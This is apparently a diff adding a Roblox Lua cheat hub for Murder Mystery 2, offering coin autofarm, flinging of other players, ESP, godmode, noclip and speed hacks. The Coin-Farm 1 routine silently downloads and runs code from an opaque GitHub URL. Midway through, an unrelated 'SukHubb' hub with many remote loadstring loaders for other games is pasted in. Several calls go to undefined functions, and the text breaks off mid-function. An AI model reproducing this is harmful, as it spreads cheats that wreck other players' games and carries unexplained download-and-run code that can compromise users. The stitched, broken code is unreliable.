@@ -1,0 +1,1772 @@
+-- Load WindUI
+local WindUI = loadstring(game:HttpGet(
+    "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
+))()
+
+-- 💜💙 Add Custom PurpleBlue Theme
+WindUI:AddTheme({
+    Name = "PurpleBlue",
+
+    Accent = Color3.fromRGB(120, 90, 255),
+    Dialog = Color3.fromRGB(30, 30, 60),
+    Outline = Color3.fromRGB(90, 70, 200),
+    Text = Color3.fromRGB(255, 255, 255),
+    Placeholder = Color3.fromRGB(180, 180, 255),
+    Background = Color3.fromRGB(20, 20, 45),
+    Button = Color3.fromRGB(100, 80, 220),
+    Icon = Color3.fromRGB(150, 130, 255)
+})
+
+-- Create Window
+local Window = WindUI:CreateWindow({
+    Title = "Lunaris-Hub MM2 💘",
+    Icon = "moon",
+    Author = "By Cruelzzss",
+    Folder = "MM2Template",
+    Size = UDim2.fromOffset(580, 460),
+    Theme = "PurpleBlue", -- 👈 change this from "Dark"
+})
+
+
+-- Create Main Section
+local Section = Window:Section({
+    Title = "Main Panel",
+    Opened = true,
+})
+
+-- =========================
+-- TABS
+-- =========================
+
+local MainTab      = Section:Tab({ Title = "Main",      Icon = "house" })
+local PlayerTab    = Section:Tab({ Title = "Player",    Icon = "user" })
+local EspTab       = Section:Tab({ Title = "ESP",       Icon = "eye" })
+local InnocentTab  = Section:Tab({ Title = "Innocent",  Icon = "shield" })
+local MurdererTab  = Section:Tab({ Title = "Murderer",  Icon = "backpack" })
+local SheriffTab   = Section:Tab({ Title = "Sheriff",   Icon = "star" })
+local TeleportTab  = Section:Tab({ Title = "Teleport",  Icon = "map" })
+local MiscTab      = Section:Tab({ Title = "Info/Misc", Icon = "info" })
+
+-- =========================
+-- MAIN TAB
+-- =========================
+
+MainTab:Paragraph({
+    Title = "Welcome",
+    Desc = "This is the main control tab.",
+})
+
+MainTab:Paragraph({
+    Title = "Normal Coin Farm",
+    Desc = "Normal, Reliable Coin Farm. ONLY CAN ENABLE ONCE. IT IS BUGGED!",
+})
+
+MainTab:Toggle({
+    Title = "Coin-Farm 1",
+    Value = false,
+    Callback = function(state)
+        -- ========================================
+-- Services
+-- ========================================
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
+
+-- ========================================
+-- Script State Variables
+-- ========================================
+local isRunning = false
+local hasReset = false
+local hasExecutedOnce = false
+local TWEEN_SPEED = 22
+local TELEPORT_DISTANCE = 200
+
+-- ========================================
+-- Coin Farm Logic
+-- ========================================
+local function startCoinCollector()
+    -- Prevents the script from running multiple times
+    if isRunning then return end
+    isRunning = true
+    warn("Coin Farm Started")
+
+    local localPlayer = Players.LocalPlayer
+
+    -- Function to get the current character and ensure it's fully loaded
+    local function getCharacter()
+        return localPlayer.Character or localPlayer.CharacterAdded:Wait()
+    end
+
+    -- Initialize character and humanoidRootPart
+    local function initializeCharacter()
+        local character = getCharacter()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+        local humanoid = character:WaitForChild("Humanoid", 5)
+        return character, humanoidRootPart, humanoid
+    end
+
+    local character, humanoidRootPart, humanoid = initializeCharacter()
+    if not humanoidRootPart then warn("HumanoidRootPart not found!"); isRunning = false; return end
+    if not humanoid then warn("Humanoid not found!"); isRunning = false; return end
+
+    -- List of possible maps and their CoinContainer paths
+    local mapPaths = {
+        "IceCastle", "SkiLodge", "Station", "LogCabin", "Bank2", "BioLab", "House2", "Factory", 
+        "Hospital3", "Hotel", "Mansion2", "MilBase", "Office3", "PoliceStation", "Workplace", 
+        "ResearchFacility", "ChristmasItaly"
+    }
+
+    -- Keep track of visited coins to prevent revisiting
+    local visitedCoins = {}
+
+    -- Function to find the active map's CoinContainer
+    local function findActiveCoinContainer()
+        for _, mapName in ipairs(mapPaths) do
+            local map = Workspace:FindFirstChild(mapName)
+            if map then
+                local coinContainer = map:FindFirstChild("CoinContainer")
+                if coinContainer then
+                    return coinContainer
+                end
+            end
+        end
+        return nil
+    end
+
+    -- Function to find the nearest coin
+    local function findNearestCoin(coinContainer)
+        local nearestCoin = nil
+        local shortestDistance = math.huge
+        if coinContainer then
+            for _, coin in ipairs(coinContainer:GetChildren()) do
+                if coin:IsA("BasePart") and not visitedCoins[coin] then
+                    local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+                    if distance < shortestDistance then
+                        shortestDistance = distance
+                        nearestCoin = coin
+                    end
+                end
+            end
+        else
+            warn("CoinContainer not found or empty!")
+        end
+        return nearestCoin
+    end
+
+    -- Function to teleport to a coin
+    local function teleportToCoin(coin)
+        if coin then
+            humanoidRootPart.CFrame = CFrame.new(coin.Position)
+            visitedCoins[coin] = true -- Mark the coin as visited
+        else
+            warn("No coin to teleport to!")
+        end
+    end
+
+    -- Function to tween to a coin
+    local function tweenToCoin(coin)
+        if coin then
+            visitedCoins[coin] = true -- Mark the coin as visited
+            local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+            local tweenInfo = TweenInfo.new(distance / TWEEN_SPEED, Enum.EasingStyle.Linear)
+            local goal = {CFrame = CFrame.new(coin.Position)}
+            local tween = TweenService:Create(humanoidRootPart, tweenInfo, goal)
+            tween:Play()
+            tween.Completed:Wait() -- Wait for the tween to finish
+        else
+            warn("No coin to tween to!")
+        end
+    end
+
+    -- Function to play falling animation
+    local function playFallingAnimation()
+        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
+        humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+    end
+
+    -- Function to check if all CoinVisuals are gone and reset character
+    local function checkForAllCoinVisualsGone()
+        local coinContainer = findActiveCoinContainer()
+        if coinContainer then
+            local allCoinVisualsGone = true
+            -- Check if any coin still has a CoinVisual
+            for _, coin in ipairs(coinContainer:GetChildren()) do
+                if coin:IsA("BasePart") then
+                    local coinVisual = coin:FindFirstChild("CoinVisual")
+                    if coinVisual then
+                        allCoinVisualsGone = false
+                        break
+                    end
+                end
+            end
+
+            -- If all CoinVisuals are gone and the character has not reset, reset the character
+            if allCoinVisualsGone and not hasReset then
+                character:BreakJoints() -- Reset character
+                visitedCoins = {} -- Reset visited coins to allow collection again
+                hasReset = true -- Set the reset flag
+                wait(1) -- Wait before continuing after reset
+            end
+
+            -- If all CoinVisuals are gone, execute the second script once
+            if allCoinVisualsGone and not hasExecutedOnce then
+                hasExecutedOnce = true
+                warn("Executing second script.")
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezqhs/-/refs/heads/main/auxqvoa"))()
+            end
+
+            -- Stop teleporting and tweening if all CoinVisuals are gone
+            if allCoinVisualsGone then
+                isRunning = false
+                warn("Coin Farm Stopped: All coins collected.")
+            end
+        end
+    end
+
+    -- Main function to tween or teleport to nearest coins
+    local function collectCoins()
+        while isRunning do
+            -- Ensure the character and humanoid are initialized
+            if not character or not humanoidRootPart or not humanoid or not character.Parent then
+                character, humanoidRootPart, humanoid = initializeCharacter()
+                if not humanoidRootPart then
+                    isRunning = false
+                    break
+                end
+            end
+
+            -- Find the active map's CoinContainer
+            local coinContainer = findActiveCoinContainer()
+            if not coinContainer then
+                warn("No active map with a CoinContainer found. Retrying...")
+                wait(0.01)
+                continue
+            end
+
+            -- Find the nearest coin
+            local targetCoin = findNearestCoin(coinContainer)
+            if not targetCoin then
+                warn("No unvisited coins available in the active map. Retrying...")
+                wait(0.01)
+                continue
+            end
+
+            -- Check if all CoinVisuals are gone and stop if necessary
+            checkForAllCoinVisualsGone()
+            if not isRunning then break end -- Stop the loop if all CoinVisuals are gone
+
+            -- Check distance and decide whether to teleport or tween
+            local distanceToCoin = (humanoidRootPart.Position - targetCoin.Position).Magnitude
+            if distanceToCoin >= TELEPORT_DISTANCE then
+                teleportToCoin(targetCoin)
+            else
+                tweenToCoin(targetCoin)
+            end
+
+            -- Play falling animation during tween
+            playFallingAnimation()
+
+            -- Check if all CoinVisuals are gone and reset if necessary
+            checkForAllCoinVisualsGone()
+
+            wait(0.01) -- Add a small wait to prevent script from running too quickly
+        end
+    end
+
+    -- Start the coin collection process
+    collectCoins()
+end
+
+-- Start the script
+startCoinCollector()
+    end
+})
+
+MainTab:Paragraph({
+    Title = "Safe Coin Farm",
+    Desc = "Safest, Fastest Coin Farm. ONLY CAN ENABLE ONCE, Kicks After Like Estimately 5-6 Hours.",
+})
+
+
+MainTab:Toggle({
+    Title = "Coin-Farm 2",
+    Description = "Placeholder.",
+    Value = false,
+    Callback = function(state)
+        -- =========================
+-- Execution Guard
+-- =========================
+
+if _G.MM2_AUTOFARM_RUNNING then
+    warn("Script is already running. Aborting duplicate execution.")
+    return
+end
+
+_G.MM2_AUTOFARM_RUNNING = true
+
+
+-- =========================
+-- MM2 Coin Autofarm (Perpetual No-GUI Edition)
+-- =========================
+
+-- Service
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- Local Player
+local localPlayer = Players.LocalPlayer
+
+-- Script State Variables
+local isRunning = true
+local TWEEN_SPEED = 22
+local TELEPORT_DISTANCE = 200
+local SINK_OFFSET = -2.5 -- How far to sink into the ground (negative is down)
+
+-- Noclip Variables
+local noclipConnection = nil
+
+-- List of possible maps and their CoinContainer paths
+local mapPaths = {
+    "IceCastle",
+    "SkiLodge",
+    "Station",
+    "LogCabin",
+    "Bank2",
+    "BioLab",
+    "House2",
+    "Factory",
+    "Hospital3",
+    "Mansion2",
+    "Office3",
+    "PoliceStation",
+    "Workplace",
+    "ResearchFacility",
+    "ChristmasItaly"
+}
+
+
+-- Keep track of visited coins for the CURRENT round
+local visitedCoins = {}
+
+-- Function to get the current character
+local function getCharacter()
+return localPlayer.Character or localPlayer.CharacterAdded:Wait()
+end
+
+-- Initialize character and its parts
+local function initializeCharacter()
+local character = getCharacter()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+local humanoid = character:WaitForChild("Humanoid", 5)
+return character, humanoidRootPart, humanoid
+end
+
+-- Function to apply noclip to the character
+local function applyNoclip()
+local character = getCharacter()
+if character and character:FindFirstChild("Humanoid") then
+character.Humanoid.PlatformStand = true -- Disables humanoid physics for smooth movement
+end
+end
+
+-- Function to start the noclip loop
+local function startNoclip()
+if noclipConnection then return end
+-- Apply noclip immediately
+applyNoclip()
+-- Create a connection to keep applying it
+noclipConnection = RunService.Stepped:Connect(function()
+if isRunning then
+applyNoclip()
+end
+end)
+end
+
+-- Function to stop the noclip loop
+local function stopNoclip()
+if noclipConnection then
+noclipConnection:Disconnect()
+noclipConnection = nil
+end
+local _, _, humanoid = initializeCharacter()
+if humanoid then
+humanoid.PlatformStand = false -- Re-enables humanoid physics
+end
+end
+
+-- Function to find the active map's CoinContainer
+local function findActiveCoinContainer()
+for _, mapName in ipairs(mapPaths) do
+local map = Workspace:FindFirstChild(mapName)
+if map then
+local coinContainer = map:FindFirstChild("CoinContainer")
+if coinContainer and #coinContainer:GetChildren() > 0 then
+return coinContainer
+end
+end
+end
+return nil
+end
+
+-- Function to find the nearest unvisited coin
+local function findNearestCoin(coinContainer, humanoidRootPart)
+local nearestCoin = nil
+local shortestDistance = math.huge
+if coinContainer then
+for _, coin in ipairs(coinContainer:GetChildren()) do
+if coin:IsA("BasePart") and not visitedCoins[coin] then
+local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+if distance < shortestDistance then
+shortestDistance = distance
+nearestCoin = coin
+end
+end
+end
+end
+return nearestCoin
+end
+
+-- Function to move to a coin (tween or teleport)
+local function moveToCoin(coin, humanoidRootPart)
+if not coin or not humanoidRootPart then return end
+visitedCoins[coin] = true -- Mark as visited immediately
+
+local distance = (humanoidRootPart.Position - coin.Position).Magnitude
+local goalCFrame = CFrame.new(coin.Position) * CFrame.new(0, SINK_OFFSET, 0)
+
+if distance >= TELEPORT_DISTANCE then
+-- Teleport for long distances
+humanoidRootPart.CFrame = goalCFrame
+else
+-- Tween for short distances
+local tweenInfo = TweenInfo.new(distance / TWEEN_SPEED, Enum.EasingStyle.Linear)
+local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = goalCFrame})
+tween:Play()
+tween.Completed:Wait()
+end
+end
+
+-- Main perpetual farming loop
+local function collectCoins()
+while isRunning do
+local _, humanoidRootPart, _ = initializeCharacter()
+if not humanoidRootPart then
+task.wait(1)
+continue
+end
+
+local coinContainer = findActiveCoinContainer()
+if not coinContainer then
+-- No coins on the map, wait for a new round to start
+warn("Waiting for new round...")
+task.wait(2)
+continue
+end
+
+local targetCoin = findNearestCoin(coinContainer, humanoidRootPart)
+if targetCoin then
+-- A coin was found, move to it
+moveToCoin(targetCoin, humanoidRootPart)
+else
+-- No unvisited coins found, the round is over.
+warn("Round complete. Resetting for next round.")
+visitedCoins = {} -- Clear the list for the next round
+
+-- Force a character reset to ensure we're ready for the next round
+local character = getCharacter()
+if character then
+character:BreakJoints()
+end
+
+-- Wait for the character to respawn and the new round to load
+task.wait(5)
+end
+task.wait(0.1)
+end
+end
+
+-- Setup character respawn listener to ensure noclip is always on
+localPlayer.CharacterAdded:Connect(function()
+if isRunning then
+applyNoclip() -- Apply noclip to the new character
+end
+end)
+
+-- Script execution logic
+local function onDied()
+-- This is a failsafe; the main loop should handle respawns
+warn("Character died. Main loop will handle recovery.")
+end
+
+local function startScript()
+local _, _, humanoid = initializeCharacter()
+if humanoid then
+humanoid.Died:Connect(onDied)
+end
+
+warn("Perpetual Coin Autofarm started.")
+startNoclip()
+task.spawn(collectCoins)
+end
+
+-- Start everything
+startScript()
+
+-- To stop the script at any time, paste this into the command bar:
+-- isRunning = false; stopNoclip();-- =========================
+-- Anti-AFK
+-- =========================
+
+local VirtualUser = game:GetService("VirtualUser")
+
+localPlayer.Idled:Connect(function()
+    VirtualUser:Button2Down(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+    task.wait(1)
+    VirtualUser:Button2Up(Vector2.new(0,0), Workspace.CurrentCamera.CFrame)
+end)
+    end
+})
+
+
+MainTab:Section({ Title = "Player Flinging" })
+
+-- A single, reusable function for flinging
+local function flingTarget(targetPlayer)
+    if not targetPlayer or not targetPlayer.Character then return end
+    
+    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+    
+    if not targetHRP or not targetHumanoid then return end
+    
+    -- Create attachment for vector force
+    local attachment = Instance.new("Attachment", targetHRP)
+    
+    -- Create the powerful vector force
+    local vectorForce = Instance.new("VectorForce", attachment)
+    vectorForce.Force = Vector3.new(0, 10000, 0) -- Strong upward force
+    vectorForce.ApplyAtCenterOfMass = true
+    
+    -- Clean up after a short moment
+    task.delay(0.2, function()
+        if attachment then attachment:Destroy() end
+        if vectorForce then vectorForce:Destroy() end
+    end)
+end
+
+-- Fling Murderer Toggle
+MainTab:Toggle({
+    Title = "Fling Murderer",
+    Description = "Flings the current murderer.",
+    Value = false,
+    Callback = function(state)
+        -- Fling Murderer
+local function FlingMurderer()
+    local Murderer = nil
+
+    for plr, role in pairs(getRoles()) do
+        if role == "Murderer" then
+            Murderer = Players:FindFirstChild(plr)
+            break
+        end
+    end
+
+    if Murderer and Murderer ~= LocalPlayer then
+        SHubFling(Murderer)
+    end
+end
+
+    end
+})
+
+-- Fling Sheriff Toggle
+MainTab:Toggle({
+    Title = "Fling Sheriff",
+    Description = "Flings the current sheriff.",
+    Value = false,
+    Callback = function(state)
+       -- Fling Sheriff or Hero
+local function FlingSheriff()
+    local Target = nil
+
+    for plr, role in pairs(getRoles()) do
+        if role == "Sheriff" or role == "Hero" then
+            Target = Players:FindFirstChild(plr)
+            break
+        end
+    end
+
+    if Target and Target ~= LocalPlayer then
+        SHubFling(Target)
+    end
+end
+
+    end
+})
+
+
+MainTab:Slider({
+    Title = "Coin Tween Speed",
+    Description = "Adjust the speed of the coin farm teleportation.",
+    Value = { Min = 5, Max = 100, Default = 22 },
+    Callback = function(value)
+        -- Update the global speed variable that the coin farm uses
+        env.COIN_FARM_SPEED = value
+        print("Coin farm speed set to:", env.COIN_FARM_SPEED)
+    end
+})
+-- =========================
+-- MAIN TAB (ADDITIONS)
+-- =========================
+
+-- Live Coin Counter
+MainTab:Paragraph({
+    Title = "Coin Counter",
+    Desc = "Loading...", -- Placeholder text
+})
+
+-- Update the coin counter every second
+local coinCounterParagraph = nil -- We'll find the paragraph element to update it
+task.spawn(function()
+    -- Find the paragraph we just created to update its description
+    -- This is a simple way to get a reference to it
+    for _, element in ipairs(MainTab.Elements) do
+        if element.Title == "Coin Counter" then
+            coinCounterParagraph = element
+            break
+        end
+    end
+
+    while true do
+        local player = game.Players.LocalPlayer
+        local leaderstats = player:FindFirstChild("leaderstats")
+        local coins = leaderstats and leaderstats:FindFirstChild("Coins")
+        
+        if coinCounterParagraph and coins then
+            coinCounterParagraph.Desc = "You have: " .. tostring(coins.Value) .. " Coins"
+        end
+        
+        task.wait(1) -- Update every second
+    end
+end)
+
+MainTab:Section({ Title = "Gun Management" })
+
+-- Placeholder Auto-Grab Gun Toggle
+MainTab:Toggle({
+    Title = "Auto-Grab Gun",
+    Description = "Automatically picks up the gun when you are the Sheriff.",
+    Value = false,
+    Callback = function(state)
+       -- Auto Grab Gun
+local function AutoGrabGunToggle(Value)
+    env.AGG = Value
+
+    while env.AGG do
+        if Char and Root then
+            local gun = Workspace:FindFirstChild("GunDrop", true)
+            if gun then
+                if firetouchinterest then
+                    firetouchinterest(Root, gun, 0)
+                    firetouchinterest(Root, gun, 1)
+                else
+                    gun.CFrame = Root.CFrame
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end
+
+    end
+})
+
+-- Placeholder Grab Gun Button
+MainTab:Button({
+    Title = "Grab Gun",
+    Description = "Instantly teleports you to the gun's location.",
+    Callback = function()
+        -- Grab Gun
+local function GrabGun()
+    if Char and Root then
+        local gun = Workspace:FindFirstChild("GunDrop", true)
+        if gun then
+            if firetouchinterest then
+                firetouchinterest(Root, gun, 0)
+                firetouchinterest(Root, gun, 1)
+            else
+                gun.CFrame = Root.CFrame
+            end
+        end
+    end
+end
+
+    end
+})
+MainTab:Button({
+    Title = "Second Life / Godmode",
+    Callback = function()
+        -- Seconds Life (Godmode)
+local function SecondsLifeToggle(Value)
+    local godcon, deathcon
+    env.enableGodmode = Value
+
+    local function IsGodmode()
+        return env.enableGodmode
+    end
+
+    local function UpdateGod()
+        if godcon then
+            godcon:Disconnect()
+            godcon = nil
+        end
+
+        if Hum then
+            godcon = Hum.HealthChanged:Connect(function()
+                if IsGodmode() and Hum.Health < Hum.MaxHealth then
+                    Hum.Health = Hum.MaxHealth
+                end
+            end)
+        end
+    end
+
+    local function OnCharacterAdded(newChar)
+        Char = newChar
+        Hum = Char:WaitForChild("Humanoid")
+        UpdateGod()
+    end
+
+    if deathcon then
+        deathcon:Disconnect()
+    end
+
+    deathcon = LocalPlayer.CharacterAdded:Connect(OnCharacterAdded)
+    UpdateGod()
+
+    task.spawn(function()
+        if not env.enableGodmode then
+            if godcon then
+                godcon:Disconnect()
+                godcon = nil
+            end
+        else
+            if not godcon then
+                UpdateGod()
+            end
+        end
+    end)
+end
+
+    end
+})
+MainTab:Button({
+    Title = "Anti-Fling",
+    Callback = function()
+        -- AntiFling (Noclip Players)
+local function AntiFlingToggle(value)
+    env.NoclipPlr = value
+
+    -- If turning OFF, restore collisions
+    if not env.NoclipPlr then
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                for _, v in pairs(player.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = true
+                    end
+                end
+            end
+        end
+        return
+    end
+
+    -- While enabled, disable collisions for other players
+    while env.NoclipPlr do
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer and player.Character then
+                for _, v in pairs(player.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then
+                        v.CanCollide = false
+                    end
+                end
+            end
+        end
+        task.wait()
+    end
+end
+
+    end
+})
+-- =========================
+-- PLAYER TAB
+-- =========================
+
+-- =========================
+-- PLAYER TAB (FUNCTIONAL)
+-- =========================
+PlayerTab:Section({ Title = "Local Player Mods" })
+
+-- Store connection objects to prevent memory leaks
+local playerConnections = {}
+
+PlayerTab:Toggle({
+    Title = "WalkSpeed Boost",
+    Description = "Enables WalkSpeed modification.",
+    Value = false,
+    Callback = function(state)
+        if state then
+            local player = game.Players.LocalPlayer
+            local function setSpeed()
+                local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.WalkSpeed = 50 -- Default boosted speed
+                end
+            end
+            setSpeed() -- Set speed immediately
+            playerConnections.speed = player.CharacterAdded:Connect(setSpeed) -- Update on respawn
+        else
+            if playerConnections.speed then
+                playerConnections.speed:Disconnect()
+                playerConnections.speed = nil
+            end
+            local player = game.Players.LocalPlayer
+            local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 16 -- Reset to default
+            end
+        end
+    end
+})
+
+PlayerTab:Slider({
+    Title = "WalkSpeed Value",
+    Description = "Set your custom WalkSpeed.",
+    Value = { Min = 16, Max = 200, Default = 50 },
+    Callback = function(value)
+        local player = game.Players.LocalPlayer
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = value
+        end
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "JumpPower Boost",
+    Description = "Enables JumpPower modification.",
+    Value = false,
+    Callback = function(state)
+        if state then
+            local player = game.Players.LocalPlayer
+            local function setJump()
+                local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid.JumpPower = 100 -- Default boosted jump
+                end
+            end
+            setJump() -- Set jump immediately
+            playerConnections.jump = player.CharacterAdded:Connect(setJump) -- Update on respawn
+        else
+            if playerConnections.jump then
+                playerConnections.jump:Disconnect()
+                playerConnections.jump = nil
+            end
+            local player = game.Players.LocalPlayer
+            local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.JumpPower = 50 -- Reset to default
+            end
+        end
+    end
+})
+
+PlayerTab:Slider({
+    Title = "JumpPower Value",
+    Description = "Set your custom JumpPower.",
+    Value = { Min = 50, Max = 300, Default = 100 },
+    Callback = function(value)
+        local player = game.Players.LocalPlayer
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.JumpPower = value
+        end
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "Infinite Jump",
+    Description = "Allows you to jump infinitely.",
+    Value = false,
+    Callback = function(state)
+        if state then
+            local UserInputService = game:GetService("UserInputService")
+            playerConnections.infiniteJump = UserInputService.JumpRequest:Connect(function()
+                local player = game.Players.LocalPlayer
+                local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+                if humanoid then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end)
+        else
+            if playerConnections.infiniteJump then
+                playerConnections.infiniteJump:Disconnect()
+                playerConnections.infiniteJump = nil
+            end
+        end
+    end
+})
+
+PlayerTab:Toggle({
+    Title = "Noclip",
+    Description = "Walk through walls and objects.",
+    Value = false,
+    Callback = function(state)
+        if state then
+            playerConnections.noclip = game:GetService("RunService").Heartbeat:Connect(function()
+                local player = game.Players.LocalPlayer
+                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                    for _, part in ipairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") and part.CanCollide then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        else
+            if playerConnections.noclip then
+                playerConnections.noclip:Disconnect()
+                playerConnections.noclip = nil
+                -- Reset collision on respawn
+                local player = game.Players.LocalPlayer
+                if player.Character then
+                    for _, part in ipairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = true
+                        end
+                    end
+                end
+            end
+        end
+    end
+})
+
+PlayerTab:Button({
+    Title = "Reset Character",
+    Description = "Forces your character to respawn.",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.Health = 0
+        else
+            player:LoadCharacter() -- Fallback method
+        end
+    end
+})
+-- =========================
+-- ESP TAB
+-- =========================
+
+EspTab:Paragraph({
+    Title = "Esp Tab",
+    Desc = "This is the esp tab.",
+})
+
+
+EspTab:Toggle({
+    Title = "Esp Players & Roles",
+    Value = false,
+    Callback = function(state)
+       local function getRoleColor(plr)
+   if (plr.Backpack:FindFirstChild("Knife") or plr.Character:FindFirstChild("Knife")) then
+       return Color3.new(255, 0, 0)
+   elseif (plr.Backpack:FindFirstChild("Gun") or plr.Character:FindFirstChild("Gun")) then
+       return Color3.new(0, 0, 255)
+   else
+       return Color3.new(0, 255, 0)
+   end
+end
+while true do
+   for _, v in pairs(game.Players:GetChildren()) do
+       if v ~= game.Players.LocalPlayer and v.Character and not v.Character:FindFirstChild("Highlight") then
+           Instance.new("Highlight", v.Character)
+           v.Character.Highlight.FillTransparency = 0.5
+           v.Character.Highlight.OutlineTransparency = 0.5
+           v.Character.Highlight.FillColor = getRoleColor(v)
+       elseif (v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Highlight")) then
+           v.Character.Highlight.FillColor = getRoleColor(v)
+       end
+   end
+   wait(0.1)
+end
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "SukHubb", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+OrionLib:MakeNotification({
+	Name = "Welcome!",
+	Content = "Thanks For Using Suk Hubb",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+local MM2 = Window:MakeTab({
+	Name = "Murder Mystrey 2",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+MM2:AddButton({
+	Name = "OP GUI (patched)",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Doggo-cryto/EclipseMM2/master/Script", true))()
+      		print("Loaded")
+  	end    
+})
+
+MM2:AddButton({
+	Name = "Vynixu's Gui",
+	Callback = function()
+        loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+
+      		print("Loaded")
+  	end    
+})
+
+local FF = Window:MakeTab({
+	Name = "Funky Friday",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+FF:AddButton({
+	Name = "Auto Player (oatched i think)",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
+      		print("Loaded")
+  	end    
+})
+
+local Doors = Window:MakeTab({
+	Name = "Doors",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Doors:AddButton({
+	Name = " items esp doors esp event notifier",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/OminousVibes-Exploit/Scripts/main/doors/main.lua"))()
+      		print("Loaded")
+  	end    
+})
+
+Doors:AddButton({
+	Name = "Avoid Rush Ambush ect",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua"))()
+      		print("Loaded")
+  	end    
+})
+
+local pf = Window:MakeTab({
+	Name = "Prison Life",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+pf:AddButton({
+	Name = "Vynixius prison life script",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Prison%20Life/Script.lua"))()
+      		print("Loaded")
+  	end    
+})
+
+local RF = Window:MakeTab({
+	Name = "Rainbow Fiends",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+
+RF:AddButton({
+	Name = "Rainbow Friends Ez Win",
+	Callback = function()
+        loadstring(game:HttpGet(("https://cdn.discordapp.com/attachments/948140763429085204/1003597010533883994/out.lua.txt"),true))()
+      		print("Loaded")
+  	end    
+})
+
+local BAB = Window:MakeTab({
+	Name = "Build A Boat",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+BAB:AddButton({
+	Name = "Vynixius Build A boat Gui",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Build%20A%20Boat%20For%20Treasure/Script.lua"))()
+      		print("Loaded")
+  	end    
+})
+
+local US = Window:MakeTab({
+	Name = "UniVersal Scritps",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+US:AddButton({
+	Name = "Universal FE",
+	Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))() 
+      		print("Loaded")
+  	end    
+})
+
+US:AddButton({
+	Name = "Infinite Yield Admin",
+	Callback = function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+      		print("Loaded")
+  	end    
+})
+
+local Arsenal = Window:MakeTab({
+	Name = "Arsenal",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Arsenal:AddButton({
+	Name = "OwlHub",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
+      		print("Loaded")
+  	end    
+})
+
+local BigP = Window:MakeTab({
+	Name = "Big Paintball",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+BigP:AddButton({
+	Name = "Paint Ball esp and more",
+	Callback = function()
